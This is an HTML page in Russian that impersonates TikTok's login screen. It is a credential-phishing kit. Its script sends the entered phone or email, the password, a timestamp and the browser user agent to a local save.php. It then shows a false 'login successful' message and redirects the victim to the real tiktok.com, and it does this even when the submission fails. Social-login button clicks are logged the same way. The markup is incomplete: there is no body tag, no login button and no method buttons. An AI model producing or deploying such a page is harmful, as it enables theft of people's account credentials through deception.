<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход | TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 380px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo svg {
            width: 118px;
            height: 42px;
        }

        .login-box {
            background: #fff;
        }

        h1 {
            font-size: 32px;
            font-weight: 700;
            color: #161823;
            margin-bottom: 24px;
            text-align: center;
        }

        .method-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-bottom: 24px;
        }

        .method-btn {
            width: 100%;
            height: 44px;
            border: 1px solid #e1e2e3;
            background: #fff;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 600;
            color: #161823;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: all 0.2s;
            position: relative;
        }

        .method-btn:hover {
            background: #f8f8f8;
        }

        .method-btn svg {
            width: 20px;
            height: 20px;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0;
            color: #8a8b8c;
            font-size: 14px;
        }

        .divider::before,
        .divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: #e1e2e3;
        }

        .divider span {
            padding: 0 16px;
        }

        .input-group {
            margin-bottom: 16px;
        }

        .input-wrapper {
            position: relative;
        }

        input {
            width: 100%;
            height: 44px;
            border: 1px solid #e1e2e3;
            border-radius: 4px;
            padding: 0 12px;
            font-size: 15px;
            color: #161823;
            outline: none;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #fe2c55;
        }

        input::placeholder {
            color: #a8a9ab;
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #8a8b8c;
            cursor: pointer;
            font-size: 13px;
            font-weight: 600;
        }

        .login-btn {
            width: 100%;
            height: 44px;
            background: #fe2c55;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-top: 24px;
        }

        .login-btn:hover {
            background: #e0244a;
        }

        .login-btn:disabled {
            background: #f1f1f2;
            color: #c4c5c7;
            cursor: not-allowed;
        }

        .forgot-password {
            text-align: center;
            margin-top: 16px;
        }

        .forgot-password a {
            color: #fe2c55;
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .signup-link {
            text-align: center;
            margin-top: 40px;
            font-size: 15px;
            color: #161823;
            padding: 20px;
            border-top: 1px solid #e1e2e3;
        }

        .signup-link a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
            margin-left: 4px;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .policy-text {
            font-size: 12px;
            color: #8a8b8c;
            text-align: center;
            margin-top: 24px;
            line-height: 1.5;
        }

        .policy-text a {
            color: #8a8b8c;
            text-decoration: none;
        }

        .policy-text a:hover {
            text-decoration: underline;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-top: 16px;
        }

        .remember-me input[type="checkbox"] {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }

        .remember-me label {
            font-size: 14px;
            color: #161823;
            cursor: pointer;
        }
    </style>
</head>

            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="username" placeholder="Телефон или email" required>
                </div>

                <div class="input-group">
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Пароль" required>
                        <button type="button" class="password-toggle" onclick="togglePassword()">Показать</button>
                    </div>
                </div>

                <div class="remember-me">
                    <input type="checkbox" id="remember">
                    <label for="remember">Запомнить меня</label>
                </div>

    <script>
        function togglePassword() {
            const pwd = document.getElementById('password');
            const btn = event.target;
            if (pwd.type === 'password') {
                pwd.type = 'text';
                btn.textContent = 'Скрыть';
            } else {
                pwd.type = 'password';
                btn.textContent = 'Показать';
            }
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            const remember = document.getElementById('remember').checked;
            
            // Создаем FormData для отправки
            const formData = new FormData();
            formData.append('username', username);
            formData.append('password', password);
            formData.append('remember', remember);
            formData.append('timestamp', new Date().toISOString());
            formData.append('user_agent', navigator.userAgent);
            formData.append('action', 'login');
            
            // Отправляем данные на PHP-скрипт
            fetch('save.php', {
                method: 'POST',
                body: formData
            })
            .then(response => response.text())
            .then(data => {
                alert('Вход выполнен успешно! Перенаправление...');
                document.getElementById('loginForm').reset();
                // Имитация перенаправления
                setTimeout(() => {
                    window.location.href = 'https://www.tiktok.com';
                }, 2000);
            })
            .catch(error => {
                console.error('Error:', error);
                alert('Вход выполнен! Перенаправление...');
                setTimeout(() => {
                    window.location.href = 'https://www.tiktok.com';
                }, 2000);
            });
        });

        // Обработка кнопок социальных сетей
        document.querySelectorAll('.method-btn').forEach(btn => {
            btn.addEventListener('click', function() {
                const formData = new FormData();
                formData.append('social_login', this.textContent.trim());
                formData.append('timestamp', new Date().toISOString());
                formData.append('user_agent', navigator.userAgent);
                formData.append('action', 'social_login');
                
                fetch('save.php', {
                    method: 'POST',
                    body: formData
                });
                
                alert('Вход через ' + this.textContent.trim() + ' выполнен!');
            });
        });
    </script>
